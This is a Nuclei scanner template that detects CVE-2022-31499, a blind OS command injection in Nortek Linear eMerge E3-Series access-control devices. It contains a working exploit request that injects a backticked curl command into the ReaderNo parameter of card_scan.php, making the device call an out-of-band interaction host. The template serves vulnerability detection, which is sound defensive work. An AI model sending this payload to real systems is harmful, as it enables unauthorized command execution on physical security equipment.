id: CVE-2022-31499

info:
  name: eMerge E3-Series Command Injection
  author: pikpikcu
  severity: critical
  description: Nortek Linear eMerge E3-Series version 0.32-09c suffers from a blind OS command injection vulnerability.
  reference:
    - https://packetstormsecurity.com/files/167991/Nortek-Linear-eMerge-E3-Series-Command-Injection.html
    - https://github.com/omarhashem123/CVE-2022-31499
    - https://nvd.nist.gov/vuln/detail/CVE-2022-31499
  tags: cve,cve2022,emerge,rce

requests:
  - raw:
      - |
        GET /card_scan.php?No=1337&ReaderNo=`curl%20{{interactsh-url}}`&CardFormatNo=1337 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
          - "dns"
